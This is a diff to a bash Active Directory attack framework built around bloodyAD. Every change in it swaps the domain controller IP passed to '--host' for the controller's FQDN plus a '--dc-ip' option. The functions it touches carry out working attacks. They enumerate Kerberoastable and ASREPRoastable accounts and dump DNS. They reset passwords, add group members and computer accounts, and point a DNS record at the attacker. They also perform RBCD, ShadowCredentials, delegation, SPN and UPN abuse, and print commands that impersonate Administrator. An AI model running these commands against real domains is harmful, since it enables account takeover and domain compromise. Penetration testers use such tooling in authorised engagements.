@@ -955,25 +955,25 @@ bloodyad_all_enum () {
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             domain_DN=$(fqdn_to_ldap_dn ${dc_domain})
             echo -e "${CYAN}[*] Searching for attribute msDS-Behavior-Version${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get object ${domain_DN} --attr msDS-Behavior-Version" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_forestlevel_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr msDS-Behavior-Version" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_forestlevel_${dc_domain}.txt 
             echo -e "${CYAN}[*] Searching for attribute ms-DS-MachineAccountQuota${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get object ${domain_DN} --attr ms-DS-MachineAccountQuota" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_maq_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr ms-DS-MachineAccountQuota" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_maq_${dc_domain}.txt 
             echo -e "${CYAN}[*] Searching for attribute minPwdLength${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get object ${domain_DN} --attr minPwdLength" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_minpasslen_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr minPwdLength" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_minpasslen_${dc_domain}.txt 
             echo -e "${CYAN}[*] Searching for users${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get children --otype useronly" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allusers_${dc_domain}.txt
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype useronly" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allusers_${dc_domain}.txt
             /bin/cat ${output_dir}/DomainRecon/bloodyAD/bloodyad_allusers_${dc_domain}.txt 2>/dev/null | cut -d "," -f 1 | cut -d "=" -f 2 | sort -u > ${output_dir}/DomainRecon/Users/users_list_bla_${dc_domain}.txt 2>/dev/null
             parse_users
             echo -e "${CYAN}[*] Searching for computers${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get children --otype computer" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allcomp_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype computer" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allcomp_${dc_domain}.txt 
             /bin/cat ${output_dir}/DomainRecon/bloodyAD/bloodyad_allcomp_${dc_domain}.txt 2>/dev/null | cut -d "," -f 1 | cut -d "=" -f 2 | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" > ${output_dir}/DomainRecon/Servers/servers_list_bla_${dc_domain}.txt 2>/dev/null
             parse_servers
             echo -e "${CYAN}[*] Searching for containers${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get children --otype container" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allcontainers_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype container" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allcontainers_${dc_domain}.txt 
             echo -e "${CYAN}[*] Searching for Kerberoastable${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName" | grep sAMAccountName | cut -d ' ' -f 2 | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_kerberoast_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName" | grep sAMAccountName | cut -d ' ' -f 2 | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_kerberoast_${dc_domain}.txt 
             echo -e "${CYAN}[*] Searching for ASREPRoastable${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_asreproast_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_asreproast_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -989,7 +989,7 @@ bloodyad_write_enum () {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
             echo -e "${BLUE}[*] bloodyad search for writable objects${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get writable" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_writable_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get writable" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_writable_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -1005,7 +1005,7 @@ bloodyad_dnsquery () {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             echo -e "${BLUE}[*] bloodyad dump DNS entries${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get dnsDump" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get dnsDump" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt
             echo -e "${YELLOW}If ADIDNS does not contain a wildcard entry, check for ADIDNS spoofing${NC}"
             /bin/cat ${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt 2>/dev/null | sed -n '/[^\n]*\*/,/^$/p'
        fi
@@ -2460,7 +2460,7 @@ change_pass () {
                 read -p ">> " pass_passchange </dev/tty
             done
             echo -e "${CYAN}[*] Changing password of ${target_passchange} to ${pass_passchange}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set password ${target_passchange} ${pass_passchange}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_passchange_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set password ${target_passchange} ${pass_passchange}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_passchange_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -2487,7 +2487,7 @@ add_group_member () {
             read -p ">> " user_groupmem </dev/tty
             if [ "${user_groupmem}" == "" ]; then user_groupmem="${user}"; fi
             echo -e "${CYAN}[*] Adding ${user_groupmem} to group ${target_groupmem}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add groupMember '${target_groupmem}' '${user_groupmem}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_groupmem_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add groupMember '${target_groupmem}' '${user_groupmem}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_groupmem_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -2509,7 +2509,7 @@ add_computer () {
             read -p ">> " pass_addcomp </dev/tty
             if [[ ${pass_addcomp} == "" ]]; then pass_addcomp="Summer3000_"; fi
             echo -e "${CYAN}[*] Creating computer ${host_addcomp} with password ${pass_addcomp}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add computer '${host_addcomp}' '${pass_addcomp}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_addcomp_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add computer '${host_addcomp}' '${pass_addcomp}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_addcomp_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -2531,7 +2531,7 @@ dnsentry_add () {
             echo -e "${BLUE}[*] Please confirm the IP of the attacker's machine:${NC}"        
             set_attackerIP
             echo -e "${BLUE}[*] Adding new DNS entry for Active Directory integrated DNS${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add dnsRecord ${hostname_dnstool} ${attacker_IP}" | tee -a ${output_dir}/Modification//bloodyAD/bloodyad_dns_${dc_domain}.txt
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add dnsRecord ${hostname_dnstool} ${attacker_IP}" | tee -a ${output_dir}/Modification//bloodyAD/bloodyad_dns_${dc_domain}.txt
        fi
     fi
     echo -e ""
@@ -2554,7 +2554,7 @@ change_owner () {
                 read -p ">> " target_ownerchange </dev/tty
             done
             echo -e "${CYAN}[*] Changing Owner of ${target_ownerchange} to ${user}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set owner ${target_ownerchange} ${user}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_ownerchange_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set owner ${target_ownerchange} ${user}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_ownerchange_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -2577,7 +2577,7 @@ add_genericall () {
                 read -p ">> " target_genericall </dev/tty
             done
             echo -e "${CYAN}[*] Adding GenericAll rights on ${target_genericall} to ${user}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add genericAll ${target_genericall} ${user}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_genericall_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add genericAll ${target_genericall} ${user}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_genericall_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -2614,7 +2614,7 @@ rbcd_attack () {
                 echo -e "${RED}Invalid name.${NC} Please specify target:"
                 read -p ">> " target_rbcd </dev/tty
             done
-            echo -e "${BLUE}[*] Please specify account under your control:${NC}"
+            echo -e "${BLUE}[*] Please specify account under your control (add $ if computer account):${NC}"
             service_rbcd=""
             read -p ">> " service_rbcd </dev/tty
             while [ "${service_rbcd}" == "" ] ; do
@@ -2622,12 +2622,12 @@ rbcd_attack () {
                 read -p ">> " service_rbcd </dev/tty
             done
             echo -e "${CYAN}[*] Performing RBCD attack against ${target_rbcd} using account ${service_rbcd}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add rbcd '${target_rbcd}$' '${service_rbcd}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add rbcd '${target_rbcd}$' '${service_rbcd}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt 
             if [[ $(grep "can now impersonate users" ${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt 2>/dev/null) ]]; then
                 echo -e "${GREEN}[+] RBCD Attack successful! Run command below to generate ticket${NC}"
-                echo -e "${impacket_getST} -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${service_rbcd}$:PASSWORD'"
+                echo -e "${impacket_getST} -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${service_rbcd}:PASSWORD'"
                 echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
-                echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} remove rbcd '${target_rbcd}$' '${service_rbcd}'"
+                echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${service_rbcd}'"
             fi
        fi
     fi
@@ -2651,7 +2651,7 @@ shadowcreds_attack () {
                 read -p ">> " target_shadowcreds </dev/tty
             done
             echo -e "${CYAN}[*] Performing ShadowCredentials attack against ${target_shadowcreds}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add shadowCredentials '${target_shadowcreds}' --path ${output_dir}/Credentials/shadowcreds_${target_shadowcreds}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_shadowcreds_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add shadowCredentials '${target_shadowcreds}' --path ${output_dir}/Credentials/shadowcreds_${target_shadowcreds}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_shadowcreds_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -2704,7 +2704,7 @@ add_unconstrained () {
                 read -p ">> " target_unconsdeleg </dev/tty
             done
             echo -e "${CYAN}[*] Adding Unconstrained Delegation rights to ${target_unconsdeleg}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add uac '${target_unconsdeleg}$' -f TRUSTED_FOR_DELEGATION" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_unconsdeleg_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add uac '${target_unconsdeleg}$' -f TRUSTED_FOR_DELEGATION" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_unconsdeleg_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -2727,8 +2727,8 @@ add_spn () {
                 read -p ">> " target_spn </dev/tty
             done
             echo -e "${CYAN}[*] Adding CIFS and HTTP SPNs to ${target_spn}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set object '${target_spn}$' ServicePrincipalName -v 'HOST/${target_spn}' -v 'HOST/${target_spn}.${domain}' -v 'RestrictedKrbHost/${target_spn}' -v 'RestrictedKrbHost/${target_spn}.${domain}' -v 'CIFS/${target_spn}.${domain}' -v 'HTTP/${target_spn}.${domain}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt 
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set object '${target_spn}$' msDS-AdditionalDnsHostName -v '${target_spn}.${domain}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' ServicePrincipalName -v 'HOST/${target_spn}' -v 'HOST/${target_spn}.${domain}' -v 'RestrictedKrbHost/${target_spn}' -v 'RestrictedKrbHost/${target_spn}.${domain}' -v 'CIFS/${target_spn}.${domain}' -v 'HTTP/${target_spn}.${domain}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' msDS-AdditionalDnsHostName -v '${target_spn}.${domain}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt
             if [[ $(grep -a "has been updated" ${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt 2>/dev/null) ]]; then
                 echo -e "${GREEN}[+] Adding CIFS and HTTP SPNs successful! Run command below to perform Kerberos relay attack${NC}"
                 echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${target_spn}.${domain} --dc-ip $dc_ip"
@@ -2763,7 +2763,7 @@ add_upn () {
                 read -p ">> " value_upn </dev/tty
             done
             echo -e "${CYAN}[*] Adding UPN ${value_upn} to ${target_upn}${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set object '${target_upn}' userPrincipalName -v '${value_upn}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_upn_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_upn}' userPrincipalName -v '${value_upn}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_upn_${dc_domain}.txt 
             if [[ $(grep -a "has been updated" ${output_dir}/Modification/bloodyAD/bloodyad_out_upn_${dc_domain}.txt 2>/dev/null) ]]; then
                 echo -e "${GREEN}[+] Adding UPN successful! First modify getTGT.py as shown below${NC}"
                 echo -e "${YELLOW}old line #58${NC}: userName = Principal(self.__user, type=constants.PrincipalNameType.${YELLOW}NT_PRINCIPAL${NC}.value)"
